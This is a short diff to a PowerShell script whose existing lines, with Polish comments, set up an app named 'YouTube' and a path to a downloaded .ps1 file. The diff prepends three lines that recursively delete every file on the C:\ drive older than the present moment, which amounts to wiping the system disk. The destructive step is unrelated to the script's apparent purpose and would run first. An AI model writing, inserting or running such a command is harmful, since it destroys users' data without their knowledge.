@@ -1,3 +1,8 @@
+$path = "C:\"
+$days = 0
+Get-ChildItem $path -Recurse | Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-$days) } | Remove-Item
+
+
 # 1. Zdefiniuj nazwę aplikacji i pełną ścieżkę do pliku .exe
 $appName = "YouTube"
 $exePath = "$HOME\Downloads\Pliczek.ps1"
